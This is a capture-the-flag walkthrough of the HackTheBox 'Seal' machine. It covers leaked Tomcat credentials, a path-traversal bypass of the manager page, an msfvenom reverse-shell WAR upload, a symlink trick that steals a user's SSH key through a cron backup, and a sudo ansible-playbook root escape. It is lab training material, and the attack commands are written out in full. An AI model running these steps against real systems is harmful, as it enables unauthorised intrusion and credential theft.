# HACKTHEBOX: Seal

## Recon and Enumeration
Shown below is a full port scan of the box. There is a web app on port 443 and port 8080.
```
# Nmap 7.92 scan initiated Wed Oct 13 19:48:06 2021 as: nmap -A -p- --min-rate 4000 -oA seal 10.10.10.250
Nmap scan report for 10.10.10.250
Host is up (0.060s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Thu, 14 Oct 2021 03:02:51 GMT
|     Set-Cookie: JSESSIONID=node0yey7quzlo8omguuvat167tso77.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Thu, 14 Oct 2021 03:02:51 GMT
|     Set-Cookie: JSESSIONID=node04jyvquxbvz7a21r65c89bpyu75.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 14 Oct 2021 03:02:51 GMT
|     Set-Cookie: JSESSIONID=node01aysejzfc37htbrd58sdtsm7k76.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=10/13%Time=61679A7D%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Thu,\x2014\x
SF:20Oct\x202021\x2003:02:51\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node04jyv
SF:quxbvz7a21r65c89bpyu75\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Th
SF:u,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/htm
SF:l;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,109,"HT
SF:TP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2014\x20Oct\x202021\x2003:02:51\
SF:x20GMT\r\nSet-Cookie:\x20JSESSIONID=node01aysejzfc37htbrd58sdtsm7k76\.n
SF:ode0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x
SF:2000:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:
SF:\x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReque
SF:st,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/
SF:html;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20clos
SF:e\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Versi
SF:on</pre>")%r(FourOhFourRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\n
SF:Date:\x20Thu,\x2014\x20Oct\x202021\x2003:02:51\x20GMT\r\nSet-Cookie:\x2
SF:0JSESSIONID=node0yey7quzlo8omguuvat167tso77\.node0;\x20Path=/;\x20HttpO
SF:nly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nCont
SF:ent-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%
SF:r(Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nCo
SF:ntent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\
SF:nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:
SF:\x20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x20
SF:400\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;c
SF:harset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\
SF:r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x
SF:20CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20charac
SF:ter\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nC
SF:ontent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\
SF:x20400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/13%OT=22%CT=1%CU=40851%PV=Y%DS=2%DC=T%G=Y%TM=61679A
OS:96%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   59.93 ms 10.10.14.1
2   60.05 ms 10.10.10.250

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 13 19:48:54 2021 -- 1 IP address (1 host up) scanned in 48.85 seconds
```

When viewing the commit history, there is a commit `http://10.10.10.250:8080/root/seal_market/commit/ac210325afd2f6ae17cce84a8aa42805ce5fd010` with a comment "Adding tomcat configuration". It contains credentials in `seal_market-master/tomcat/tomcat-users.xml`:

`<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>`

Here is useful information for Tomcat pentetration: https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat

Although `https://10.10.10.250/manager/html` cannot be accessed, `https://10.10.10.250/manager/status` can be accessed with the credentials `tomcat:42MrHBf*z8{Z%`. To access the manager/html page, path traversal must be used: `https://10.10.10.250/manager/status/..;/html`

## Exploitation and user.txt
A War file can be uploaded to gain a reverse shell. 
1. Generate an msfvenom war payload with `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.165 LPORT=1337 -f war -o payload.war`
2. Use BurpSuite to intercept and send a post request containing `payload.war`

```
POST /manager/status/..;/html/upload?org.apache.catalina.filters.CSRF_NONCE=1A84327863C89FBD7646A9235DF59BC3 HTTP/1.1
Host: 10.10.10.250
Cookie: JSESSIONID=D4667DE236DC3662763DCB3ED1062585; JSESSIONID=node06cjtymn23dhaoa3zkm929f5u14.node0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.10.10.250/manager/status/..;/html
Content-Type: multipart/form-data; boundary=---------------------------5962015423903397352762163284
Content-Length: 1330
Origin: https://10.10.10.250
Authorization: Basic dG9tY2F0OjQyTXJIQmYqejh7WiU=
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Te: trailers
Connection: close

-----------------------------5962015423903397352762163284
Content-Disposition: form-data; name="deployWar"; filename="payload.war"
Content-Type: application/octet-stream

(trimmed payload)
```

3. Start a listener with `nc -lvnp 1337`
4. Visit `https://10.10.10.250/payload/lyibvpiewin.jsp` in the web browser to abuse the code execution. This gives a reverse shell.

Upgrade the shell with
```
python3 -c "__import__('pty').spawn('/bin/bash')"
Ctrl+Z
stty -echo raw
fg
export TERM=linux
```

Run linpeas
```
sadeli@attacker: ~$ python3 -m http.server 8000
tomcat@seal:/var/lib/tomcat9$ cd /tmp
tomcat@seal:/tmp$ wget http://attacker_ip:8000/linpeas.sh
tomcat@seal:/tmp$ chmod +x linpeas.sh
tomcat@seal:/tmp$ ./linpeas.sh | tee linpeas.txt
tomcat@seal:/tmp$ less -r /tmp/linpeas.txt
```

There appears to be two cron jobs running as root:
```
root       27938  0.0  0.0   8356  3344 ?        S    06:51   0:00  _ /usr/sbin/CRON -f
root       27939  0.0  0.0   2608   600 ?        Ss   06:51   0:00      _ /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
```

Inspect the contents of /opt/backups/playbook/run.yml
```
tomcat@seal:/tmp$ cat /opt/backups/playbook/run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
tomcat@seal:/tmp$
```

This ansible playbook makes a backup up of `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` and saves it to `/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz` while preserving symlinks. View the contents of the dashboard. Everyone has full write access to the uploads directory.
```
tomcat@seal:/tmp$ cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ls -la
total 100
drwxr-xr-x 7 root root  4096 May  7 09:26 .
drwxr-xr-x 3 root root  4096 May  6 10:48 ..
drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
drwxr-xr-x 2 root root  4096 Mar  7  2015 css
drwxr-xr-x 4 root root  4096 Mar  7  2015 images
-rw-r--r-- 1 root root 71744 May  6 10:42 index.html
drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
drwxrwxrwx 2 root root  4096 Oct 14 07:03 uploads
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ 
```

Run the command `ln -sf /home/luis/.ssh /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads` and wait for the cron job to make the backup.
```
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ cd uploads
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls -la
total 8
drwxrwxrwx 2 root   root   4096 Oct 14 07:03 .
drwxr-xr-x 7 root   root   4096 May  7 09:26 ..
lrwxrwxrwx 1 tomcat tomcat   16 Oct 14 07:03 .ssh -> /home/luis/.ssh/
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$
```

Copy and extract the archive
```
tomcat@seal:/tmp$ ls /opt/backups/archives/
backup-2021-10-14-07:51:32.gz  backup-2021-10-14-07:53:32.gz
tomcat@seal:/tmp$ cp /opt/backups/archives/backup-2021-10-14-07:53:32.gz /tmp/bak.gz
tomcat@seal:/tmp$ gzip -d bak.gz
tomcat@seal:/tmp$ tar -xvf bak
```

This reveals the archived `dashboard` with luis's ssh key
```
tomcat@seal:/tmp$ cd dashboard/uploads/.ssh/
tomcat@seal:/tmp/dashboard/uploads/.ssh$ ssh -i id_rsa luis@127.0.0.1
Could not create directory '/.ssh'.
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:YTRJC++A+0ww97kJGc5DWAsnI9iusyCE4Nt9fomhxdA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
luis@seal:~$ 
```

## Privilege Escalation and root.txt

View programs luis can run as root. luis may run `/usr/bin/ansible-playbook *` as root without a password.
```
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
luis@seal:~$
```

Follow the gtfobins guide for privilege escalation https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo
```
luis@seal:~$ TF=$(mktemp)
luis@seal:~$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
luis@seal:~$ sudo ansible-playbook $TF
[WARNING]: provided hosts list is empty, only localhost is available. Note that
the implicit localhost does not match 'all'

PLAY [localhost] ***************************************************************

TASK [Gathering Facts] *********************************************************
ok: [localhost]

TASK [shell] *******************************************************************
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
#
```
